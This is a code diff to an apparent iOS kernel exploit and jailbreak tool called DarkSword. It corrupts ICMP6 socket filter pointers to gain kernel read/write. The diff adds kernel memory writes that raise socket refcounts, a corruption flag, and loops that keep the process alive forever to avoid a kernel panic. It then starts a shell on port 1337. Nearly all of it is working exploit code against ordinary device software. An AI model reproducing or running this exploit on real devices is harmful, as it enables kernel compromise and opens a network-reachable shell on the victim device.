@@ -113,6 +113,14 @@ static NSMutableArray *socketPcbIds;
 static int controlSocket = 0, rwSocket = 0;
 static uint64_t controlSocketPcb = 0, rwSocketPcb = 0;
 static int socketCsi = -1;
+// TRUE the instant find_and_corrupt_socket() plants control.icmp6filt ->
+// rwSocketPcb+0x148. From that moment the process MUST NEVER exit: closing
+// the control fd runs in6_pcbdetach -> kfree(in6p_icmp6filt), whose pointer
+// now resolves into the inpcb/socket zone (not data.kalloc.32) ->
+// "not in the expected zone data.kalloc.32, but found in socket[498]" panic
+// (observed on-device 2026-08-01 23:13). All paths past this point either
+// succeed (then keep the runloop alive forever) or spin instead of returning.
+static bool gSocketsCorrupted = false;
 // Every socket port whose inpcb icmp6filt has ever been corrupted. Such a
 // socket can NEVER be closed/deallocated (kfree of the poisoned filter ->
 // zone panic, observed twice), so all release paths skip these.
@@ -605,6 +613,36 @@ void kwrite_buf(uint64_t where, void *buf, size_t size) {
     }
 }
 
+// Raise so_usecount on both corrupted sockets the moment the primitive is
+// proven. The kernel paniced at 23:13: xnu soclose() runs
+//   so->so_proto->pr_detach = in6_pcbdetach() -> FREE(in6p_icmp6filt)   (0x20)
+// UNCONDITIONALLY, before sourceling so_usecount -- so ANY path that closes
+// control/rw (sockets_release on retry, fd teardown at exit) kfrees a pointer
+// into the inpcb/socket zone -> "not in expected zone data.kalloc.32" panic.
+// so_usecount is per-socket refcount; soclose()sorele() also free the socket
+// object itself when it reaches zero. We CANNOT stop the filter kfree via
+// usecount, so the only safe invariant is: after corruption these fds are
+// never ever closed and the process never exits. This bump is belt-and-braces
+// for the socket object itself (prevents zone recycling of the dead socket
+// across retries), matching lara's krw_sockets_leak_forever().
+static void leak_corrupted_sockets(void) {
+    if (!controlSocketPcb || !rwSocketPcb || !gSocketsCorrupted) return;
+    uint64_t csa = kread64(controlSocketPcb + OFFSET_PCB_SOCKET);
+    uint64_t rsa = kread64(rwSocketPcb + OFFSET_PCB_SOCKET);
+    if ((csa >> 40) != 0xFFFFFF || (rsa >> 40) != 0xFFFFFF) return;
+    uint64_t c = kread64(csa + OFFSET_SOCKET_SO_COUNT);
+    uint64_t r = kread64(rsa + OFFSET_SOCKET_SO_COUNT);
+    if (c > 0x10000 || r > 0x10000) return;
+    gControlSocketAddr = csa;
+    gRwSocketAddr = rsa;
+    kwrite64(csa + OFFSET_SOCKET_SO_COUNT, c + 0x0000100100001001ULL);
+    kwrite64(rsa + OFFSET_SOCKET_SO_COUNT, r + 0x0000100100001001ULL);
+    // Zero rw's filter-list back link so the corrupted filter never links the
+    // two inpcb filter chains.
+    kwrite64(rwSocketPcb + gIcmp6FiltOffset + 8, 0);
+    printf("[+] so_usecount raised immediately after corruption (csa=0x%llx rsa=0x%llx)\n", csa, rsa);
+}
+
 int find_and_corrupt_socket(mach_port_t memObj, mach_vm_offset_t seekOff,
                              void *rBuf, void *wBuf, NSMutableArray *usedGc, bool doRead) {
     if (doRead) phys_oob_read_retry(memObj, seekOff, OOB_SIZE, OOB_OFFSET, rBuf);
@@ -759,6 +797,7 @@ int find_and_corrupt_socket(mach_port_t memObj, mach_vm_offset_t seekOff,
         gIcmp6FiltOffset = icmp6filtOffset;
         rwSocket = fileport_makefd((fileport_t)[(NSNumber*)socketPorts[csi + 1] unsignedLongLongValue]);
         [leakedPorts addObject:[(NSMutableArray*)socketPorts objectAtIndex:csi + 1]];
+        gSocketsCorrupted = true;
         printf("[+] found control_socket at idx: %d (marker=0x%llx), rw idx=%d\n",
             csi, (unsigned long long)marker, csi + 1);
         fflush(stdout);
@@ -1801,7 +1840,32 @@ bool run_darksword(void) {
         }
 
         if (ok) {
-            ok = validate_krw_sockets();
+            // validate() proves control/rw chain and records csa/rsa globals;
+            // it is READ-ONLY on the corrupted pair.
+            uint64_t vOk = validate_krw_sockets();
+
+            // ALWAYS pin the corrupted pair the moment corruption succeeded,
+            // regardless of validate outcome. rw's pcb (inpNext) is certain
+            // here; control's pcb is certain iff validate resolved it. Even a
+            // partial pin prevents the exit/retry kfree zone-panic that
+            // crashed the app at 23:13:
+            //   "0x... not in expected zone data.kalloc.32, found in socket"
+            // (close(control fd) -> in6_pcbdetach -> FREE(rw_socket_zone_ptr)).
+            leak_corrupted_sockets();
+            ok = vOk;
+
+            if (!ok && gSocketsCorrupted) {
+                // CORRUPTED but UNVERIFIED -- retrying would call
+                // sockets_release_except_pair(), which closes the poisoned
+                // control fd (deallocating its mach port drops the fileproc's
+                // last reference -> fp_close -> soclose -> kfree zone panic).
+                // The ONLY safe state is: keep every socket open forever.
+                printf("[-] validate failed AFTER corruption -- entering permanent"
+                       " hold (never close, never exit)\n");
+                fflush(stdout);
+                abortPoisoned = true;   // reuse: no release, no retry
+                goto abort_no_release;
+            }
         }
 
         // PANIC MITIGATION: only release sockets when the attempt FAILED, and
@@ -1861,24 +1925,15 @@ abort_no_release:
         return false;
     }
 
+    // Raise so_usecount on the corrupted pair NOW (idempotent-safe bump).
+    // This must happen before any possible close() of the corrupted fds: xnu
+    // soclose() -> in6_pcbdetach() -> FREE(in6p_icmp6filt) runs unconditionally
+    // on detach and kfrees a 0x20 pointer that now points into the inpcb zone
+    // -> "not in expected zone data.kalloc.32" panic. After this point the
+    // process must NEVER exit and these fds must never be closed.
     printf("[+] raising so_count (csa=0x%llx rsa=0x%llx)\n", csa, rsa);
     fflush(stdout);
-
-    // so_usecount (0x254) must be a small refcount. A sane socket reads back a
-    // low value; anything huge means csa/rsa is NOT a socket (recycled/other
-    // object) and writing there would corrupt a live struct -> panic. Guard so
-    // a bad chain aborts cleanly instead of corrupting memory.
-    uint64_t cSoCount = kread64(csa + OFFSET_SOCKET_SO_COUNT);
-    uint64_t rSoCount = kread64(rsa + OFFSET_SOCKET_SO_COUNT);
-    if (cSoCount > 0x10000 || rSoCount > 0x10000) {
-        printf("[-] so_usecount looks wrong (csa 0x%llx rsa 0x%llx) -- aborting, not corrupting\n",
-               cSoCount, rSoCount);
-        fflush(stdout);
-        return false;
-    }
-    kwrite64(csa + OFFSET_SOCKET_SO_COUNT, cSoCount + 0x0000100100001001ULL);
-    kwrite64(rsa + OFFSET_SOCKET_SO_COUNT, rSoCount + 0x0000100100001001ULL);
-    kwrite64(rwSocketPcb + gIcmp6FiltOffset + 8, 0);
+    leak_corrupted_sockets();
     printf("[+] so_count raised, icmp6filt+8 zeroed (filtOff=+0x%llx)\n",
         (unsigned long long)gIcmp6FiltOffset);
     fflush(stdout);
@@ -2516,6 +2571,14 @@ void run_jailbreak(void) {
         printf("[Phase 1] Running DarkSword exploit...\n");
         if (!run_darksword()) {
             printf("[-] Exploit failed (no kernel R/W)\n");
+            if (gSocketsCorrupted) {
+                // Corrupted icmp6 filters exist; exiting or retrying-close would
+                // kfree() a poisoned pointer -> zone panic. lara keeps the app
+                // alive forever after KRW; do the same here on failure.
+                printf("[!] sockets corrupted - NEVER EXITING (keep app open)\n");
+                fflush(stdout);
+                while (1) { sleep(3600); }
+            }
             return;
         }
         printf("[+] Kernel R/W via ICMP6 sockets\n\n");
@@ -2552,8 +2615,22 @@ void run_jailbreak(void) {
         printf("Kernel base: 0x%llx\n", gKernelBase);
         printf("Kernel slide: 0x%llx\n\n", gKernelSlide);
 
+        // The corrupted control/rw sockets (poisoned in6p_icmp6filt) are only
+        // safe while this process holds them open. If the app exits, iOS closes
+        // those fds, the kernel kfree()s the poisoned filter, and we get the
+        // "data.kalloc.32 not in expected zone" panic from the 23:13 run. So
+        // once KRW is live we must NEVER let this process terminate: park on a
+        // never-ending pause() loop. The UI stays up; the shell listens on 1337.
+        printf("[!] KRW established - process will NOT exit (keep app foreground).\n");
+        printf("[!] Panic-guard active: closing the app WILL kernel-panic.\n");
+        fflush(stdout);
+
         printf("Starting shell on port 1337...\n");
-        start_shell(1337);
+        start_shell(1337);   // never returns while a client is served
+
+        // If the shell ever returns, still refuse to exit: the corrupted sockets
+        // stay open only for as long as this task lives.
+        for (;;) pause();
     }
 }
 
